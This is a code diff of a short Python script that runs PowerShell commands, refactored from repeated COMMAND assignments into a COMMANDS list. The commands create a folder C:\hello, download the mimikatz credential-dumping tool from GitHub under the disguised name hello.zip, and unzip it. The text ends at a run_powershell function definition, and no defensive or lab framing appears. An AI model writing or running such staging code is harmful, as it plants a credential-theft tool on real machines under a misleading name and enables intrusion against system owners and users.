@@ -1,9 +1,11 @@
 import subprocess
 
 #powershell command to execute
-COMMAND = "mkdir C:\hello"
-COMMAND = "curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip" 
-COMMAND = 'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"'
+COMMANDS = [
+    r'mkdir C:\hello',
+    r'curl.exe -L https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip -o C:\hello\hello.zip',
+    r'Expand-Archive -Path "C:/hello/hello.zip" -DestinationPath "C:/hello/unzipped"',
+]
 
 
 def run_powershell(command: str):
